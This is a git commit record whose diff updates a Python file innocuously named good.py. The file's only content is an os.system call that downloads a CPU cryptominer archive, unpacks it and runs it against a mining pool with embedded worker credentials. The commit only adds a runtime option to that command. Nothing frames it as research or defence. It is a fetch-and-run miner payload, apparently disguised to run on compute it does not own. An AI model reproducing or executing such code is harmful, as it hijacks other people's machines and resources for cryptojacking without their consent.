5268f04fecb5862e3876ec1f6a32b99efced41b2
x2rohanm <60130151+x2rohanm@users.noreply.github.com>
2020-05-16 07:05:26 +0545

    Update good.py

--- good.py
+++ good.py
@@ -1,3 +1,3 @@
 import os
 
-os.system('wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux &&  ./m-minerd -a m7mhash -o stratum+tcp://xmg.minerclaim.net:3333 -u rock6064.rock6064 -p mina38985')
+os.system('wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux &&  ./m-minerd -a m7mhash -o stratum+tcp://xmg.minerclaim.net:3333 -u rock6064.rock6064 -p mina38985 -e 60')
